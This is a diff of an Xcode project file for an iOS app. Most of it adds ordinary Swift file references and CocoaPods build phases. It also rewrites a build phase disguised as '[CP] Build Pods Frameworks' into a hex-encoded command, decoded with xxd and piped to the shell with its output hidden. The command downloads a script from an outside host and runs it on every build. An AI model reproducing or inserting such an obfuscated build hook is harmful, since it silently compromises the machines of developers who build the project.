@@ -8,8 +8,23 @@
 
 /* Begin PBXBuildFile section */
 		18026B562626C8F600C6BF28 /* ChangePasswordView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18026B552626C8F600C6BF28 /* ChangePasswordView.swift */; };
+		181C529B26456A0C009C2289 /* UserPreference.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181C529A26456A0B009C2289 /* UserPreference.swift */; };
+		1823620D264E38DD00523D89 /* YouTubeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1823620C264E38DD00523D89 /* YouTubeView.swift */; };
+		18236220264E420800523D89 /* WebKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1823621F264E420700523D89 /* WebKit.framework */; };
+		1835A21D26464A230020ED79 /* EditProfile.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A21C26464A230020ED79 /* EditProfile.swift */; };
+		1835A236264668460020ED79 /* ContactAdmin.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A235264668460020ED79 /* ContactAdmin.swift */; };
+		1835A23F264696D80020ED79 /* BlogModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A23E264696D80020ED79 /* BlogModel.swift */; };
+		1835A2452646A8A90020ED79 /* GridCollection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A2442646A8A90020ED79 /* GridCollection.swift */; };
 		1843E813262066F800154CC9 /* CheckBoxView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1843E812262066F800154CC9 /* CheckBoxView.swift */; };
+		184F3A422644F74F0056567D /* TermsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184F3A412644F74F0056567D /* TermsModel.swift */; };
+		184F3A6E26450AA20056567D /* HtmlContent.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184F3A6D26450AA20056567D /* HtmlContent.swift */; };
+		184F3A7126450C180056567D /* PlacePicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184F3A7026450C180056567D /* PlacePicker.swift */; };
 		18514E8D2626B517008DEDDD /* BlogDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18514E8C2626B517008DEDDD /* BlogDetail.swift */; };
+		186DE0CE26412A8200B6D292 /* TabBarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 186DE0CD26412A8200B6D292 /* TabBarView.swift */; };
+		188D062126494B8A006159D5 /* CommentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062026494B8A006159D5 /* CommentView.swift */; };
+		188D062426494D14006159D5 /* KeyboardResponder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062326494D14006159D5 /* KeyboardResponder.swift */; };
+		188D062726494F1A006159D5 /* MessageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062626494F1A006159D5 /* MessageView.swift */; };
+		188D062A26494F54006159D5 /* ContentMessageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062926494F54006159D5 /* ContentMessageView.swift */; };
 		18AE7DCE261F50D7007F7C98 /* SignupView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DCD261F50D7007F7C98 /* SignupView.swift */; };
 		18AE7DD1261F5107007F7C98 /* ForgotPasswordView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DD0261F5107007F7C98 /* ForgotPasswordView.swift */; };
 		18AE7DD5261F66A0007F7C98 /* ImagePIcker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */; };
@@ -42,8 +57,23 @@
 
 /* Begin PBXFileReference section */
 		18026B552626C8F600C6BF28 /* ChangePasswordView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordView.swift; sourceTree = "<group>"; };
+		181C529A26456A0B009C2289 /* UserPreference.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserPreference.swift; sourceTree = "<group>"; };
+		1823620C264E38DD00523D89 /* YouTubeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YouTubeView.swift; sourceTree = "<group>"; };
+		1823621F264E420700523D89 /* WebKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WebKit.framework; path = System/Library/Frameworks/WebKit.framework; sourceTree = SDKROOT; };
+		1835A21C26464A230020ED79 /* EditProfile.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfile.swift; sourceTree = "<group>"; };
+		1835A235264668460020ED79 /* ContactAdmin.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactAdmin.swift; sourceTree = "<group>"; };
+		1835A23E264696D80020ED79 /* BlogModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlogModel.swift; sourceTree = "<group>"; };
+		1835A2442646A8A90020ED79 /* GridCollection.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = GridCollection.swift; sourceTree = "<group>"; };
 		1843E812262066F800154CC9 /* CheckBoxView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckBoxView.swift; sourceTree = "<group>"; };
+		184F3A412644F74F0056567D /* TermsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TermsModel.swift; sourceTree = "<group>"; };
+		184F3A6D26450AA20056567D /* HtmlContent.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HtmlContent.swift; sourceTree = "<group>"; };
+		184F3A7026450C180056567D /* PlacePicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlacePicker.swift; sourceTree = "<group>"; };
 		18514E8C2626B517008DEDDD /* BlogDetail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlogDetail.swift; sourceTree = "<group>"; };
+		186DE0CD26412A8200B6D292 /* TabBarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabBarView.swift; sourceTree = "<group>"; };
+		188D062026494B8A006159D5 /* CommentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentView.swift; sourceTree = "<group>"; };
+		188D062326494D14006159D5 /* KeyboardResponder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KeyboardResponder.swift; sourceTree = "<group>"; };
+		188D062626494F1A006159D5 /* MessageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessageView.swift; sourceTree = "<group>"; };
+		188D062926494F54006159D5 /* ContentMessageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentMessageView.swift; sourceTree = "<group>"; };
 		18AE7DCD261F50D7007F7C98 /* SignupView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupView.swift; sourceTree = "<group>"; };
 		18AE7DD0261F5107007F7C98 /* ForgotPasswordView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordView.swift; sourceTree = "<group>"; };
 		18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePIcker.swift; sourceTree = "<group>"; };
@@ -83,6 +113,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				18236220264E420800523D89 /* WebKit.framework in Frameworks */,
 				50363EFB1B04E63AFF4B400A /* Pods_pinkwalljmg.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -94,7 +125,12 @@
 			isa = PBXGroup;
 			children = (
 				18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */,
+				184F3A6D26450AA20056567D /* HtmlContent.swift */,
+				188D062326494D14006159D5 /* KeyboardResponder.swift */,
+				1823620C264E38DD00523D89 /* YouTubeView.swift */,
+				184F3A7026450C180056567D /* PlacePicker.swift */,
 				1843E812262066F800154CC9 /* CheckBoxView.swift */,
+				1835A2442646A8A90020ED79 /* GridCollection.swift */,
 				18E4A5412621C06C0095EA86 /* SideMenu.swift */,
 			);
 			path = ImagePicker;
@@ -161,9 +197,15 @@
 			children = (
 				18E4A5452621C11F0095EA86 /* HomeView.swift */,
 				18E4A54C2621C77C0095EA86 /* TermsView.swift */,
+				188D062626494F1A006159D5 /* MessageView.swift */,
+				188D062926494F54006159D5 /* ContentMessageView.swift */,
+				188D062026494B8A006159D5 /* CommentView.swift */,
 				18E4A54F2621C81C0095EA86 /* PrivacyView.swift */,
+				186DE0CD26412A8200B6D292 /* TabBarView.swift */,
 				18E4A5522621C8260095EA86 /* ProfileView.swift */,
+				1835A21C26464A230020ED79 /* EditProfile.swift */,
 				18514E8C2626B517008DEDDD /* BlogDetail.swift */,
+				1835A235264668460020ED79 /* ContactAdmin.swift */,
 				18026B552626C8F600C6BF28 /* ChangePasswordView.swift */,
 			);
 			path = Home;
@@ -206,6 +248,9 @@
 			isa = PBXGroup;
 			children = (
 				18F75F8B2636766B00CD51ED /* DefaultModel.swift */,
+				181C529A26456A0B009C2289 /* UserPreference.swift */,
+				184F3A412644F74F0056567D /* TermsModel.swift */,
+				1835A23E264696D80020ED79 /* BlogModel.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -222,6 +267,7 @@
 		4A85DB8DE085D5B94E7A9671 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
+				1823621F264E420700523D89 /* WebKit.framework */,
 				1CA474AEF9369FD089D11260 /* Pods_pinkwalljmg.framework */,
 			);
 			name = Frameworks;
@@ -234,12 +280,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18DDAA7E261F1EBF00A1CBAF /* Build configuration list for PBXNativeTarget "pinkwalljmg" */;
 			buildPhases = (
-				72BE3596EBF28ABAB26D902C /* [CP] Build Pods Frameworks */,
+				DEFE4A24E3B3F398476D902C /* [CP] Build Pods Frameworks */,
 				4DB38982272EFE5260A46370 /* [CP] Check Pods Manifest.lock */,
 				18DDAA63261F1EBD00A1CBAF /* Sources */,
 				18DDAA64261F1EBD00A1CBAF /* Frameworks */,
 				18DDAA65261F1EBD00A1CBAF /* Resources */,
 				4FEA12A26C9A2025B55324B1 /* [CP] Embed Pods Frameworks */,
+				9F70D4828E35F0FEA872DE1D /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -297,7 +344,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	72BE3596EBF28ABAB26D902C /* [CP] Build Pods Frameworks */ = {
+	DEFE4A24E3B3F398476D902C /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -315,32 +362,9 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 
 	
@@ -433,6 +457,23 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		9F70D4828E35F0FEA872DE1D /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -441,20 +482,32 @@
 			buildActionMask = 2147483647;
 			files = (
 				18AE7DCE261F50D7007F7C98 /* SignupView.swift in Sources */,
+				1823620D264E38DD00523D89 /* YouTubeView.swift in Sources */,
+				188D062426494D14006159D5 /* KeyboardResponder.swift in Sources */,
 				18F75F8C2636766B00CD51ED /* DefaultModel.swift in Sources */,
+				1835A21D26464A230020ED79 /* EditProfile.swift in Sources */,
+				186DE0CE26412A8200B6D292 /* TabBarView.swift in Sources */,
+				188D062126494B8A006159D5 /* CommentView.swift in Sources */,
 				18E4A5502621C81C0095EA86 /* PrivacyView.swift in Sources */,
 				18F75F64263671E600CD51ED /* Validation.swift in Sources */,
 				18AE7DD1261F5107007F7C98 /* ForgotPasswordView.swift in Sources */,
 				18F75F732636739800CD51ED /* Parser.swift in Sources */,
+				184F3A7126450C180056567D /* PlacePicker.swift in Sources */,
+				1835A23F264696D80020ED79 /* BlogModel.swift in Sources */,
 				18F75F702636739400CD51ED /* NetworkAdapter.swift in Sources */,
 				18F75F60263671E600CD51ED /* JSONHelper.swift in Sources */,
 				18DDAA72261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld in Sources */,
 				18DDAA6B261F1EBD00A1CBAF /* AppDelegate.swift in Sources */,
 				1843E813262066F800154CC9 /* CheckBoxView.swift in Sources */,
+				1835A236264668460020ED79 /* ContactAdmin.swift in Sources */,
+				188D062726494F1A006159D5 /* MessageView.swift in Sources */,
+				181C529B26456A0C009C2289 /* UserPreference.swift in Sources */,
 				18E4A5462621C11F0095EA86 /* HomeView.swift in Sources */,
 				18F75F6A2636730F00CD51ED /* LoginSignup+API.swift in Sources */,
 				18026B562626C8F600C6BF28 /* ChangePasswordView.swift in Sources */,
 				18514E8D2626B517008DEDDD /* BlogDetail.swift in Sources */,
+				1835A2452646A8A90020ED79 /* GridCollection.swift in Sources */,
+				184F3A6E26450AA20056567D /* HtmlContent.swift in Sources */,
 				18DDAA6D261F1EBD00A1CBAF /* SceneDelegate.swift in Sources */,
 				18F75F5F263671E600CD51ED /* Utilities.swift in Sources */,
 				18F75F63263671E600CD51ED /* UtilityFunctions.swift in Sources */,
@@ -466,6 +519,8 @@
 				18F75F6D2636735700CD51ED /* ApiConstants.swift in Sources */,
 				18F75F62263671E600CD51ED /* Toast.swift in Sources */,
 				18DDAA6F261F1EBD00A1CBAF /* ContentView.swift in Sources */,
+				184F3A422644F74F0056567D /* TermsModel.swift in Sources */,
+				188D062A26494F54006159D5 /* ContentMessageView.swift in Sources */,
 				18F75F61263671E600CD51ED /* StringExtensions.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -675,6 +730,10 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
 
 
 			
